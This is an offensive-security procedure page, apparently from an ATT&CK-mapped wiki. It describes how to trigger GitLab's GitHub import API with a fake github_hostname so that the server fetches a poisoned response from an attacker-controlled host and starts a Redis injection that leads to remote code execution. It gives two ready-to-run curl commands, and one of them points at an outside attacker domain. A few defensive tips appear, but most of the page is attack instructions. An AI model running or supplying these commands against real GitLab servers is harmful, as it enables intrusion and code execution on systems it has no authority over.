---
id: proc-trigger-import
name: Trigger-GitHub-Import-via-API
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:14.387Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
tags:
  - api-trigger
  - curl
  - import
commands:
  - '[[commands/curl-trigger-import]]'
  - '[[commands/curl-trigger-import-example]]'
platforms:
  - Web
tools:
  - '[[tools/curl]]'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---

# Trigger-GitHub-Import-via-API

## Summary

This procedure uses curl to POST to GitLab's /api/v4/import/github endpoint, specifying a fake GitHub hostname to direct queries to the attacker's server.

## Description

The import request includes a fake personal access token, repo_id, namespace, and custom github_hostname, causing GitLab to fetch data from the dummy server and process the poisoned response, initiating the Sawyer/Redis injection.

## Requirements

1. Valid GitLab API token
2. Running dummy server on accessible IP/port
3. curl installed

## Defense

Defensive measures and detection strategies:

- Validate github_hostname against official GitHub domains
- Rate-limit import API calls
- Audit logs for custom hostnames in import payloads

## Objectives

1. Initiate import process targeting fake server
2. Authenticate with GitLab token
3. Trigger outbound requests to attacker-controlled endpoint

## Instructions

### Step 1: Prepare Payload

**Context**: Construct JSON payload with fake details.

Include repo_id: 356289002, new_name: poc-rce, target_namespace: YOUR_USERNAME, github_hostname: http://YOUR_IP:YOUR_PORT.

**Expected Output**: Valid JSON string.

### Step 2: Execute Curl Request

**Context**: Send POST to import endpoint.

Execute [[commands/curl-trigger-import]]:

```bash
curl -kv "http://gitlab.example.com/api/v4/import/github" --request POST --header "content-type: application/json" --header "PRIVATE-TOKEN: YOUR_GITLAB_TOKEN" --data '{"personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "repo_id": "356289002", "target_namespace": "YOUR_GITLAB_USERNAME", "new_name": "poc-rce", "github_hostname": "http://YOUR_IP:YOUR_PORT"}'
```

**Expected Output**: Response like {"id": xxx, "status": "started"}.

### Step 3: Alternative with Dynamic Name

**Context**: Use example with date for uniqueness.

Execute [[commands/curl-trigger-import-example]]:

```bash
curl "http://gitlab.example.com/api/v4/import/github" --request POST --header "content-type: application/json" --header "PRIVATE-TOKEN: 3LCvKWXVF-Gadcnbxxxx" --data '{ "personal_access_token": "xxxxx", "repo_id": "356289002", "target_namespace": "root", "new_name": "NEW-NAME-'$(date +%s)'", "github_hostname": "http://ns.yvvdwf.me:80" }'
```

**Expected Output**: Import initiated with dynamic project name.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/curl-trigger-import]]
- [[commands/curl-trigger-import-example]]

## Tools Used

- [[tools/curl]]

## Tags

- [[api-trigger]]
- [[tools/curl]]
- [[import]]
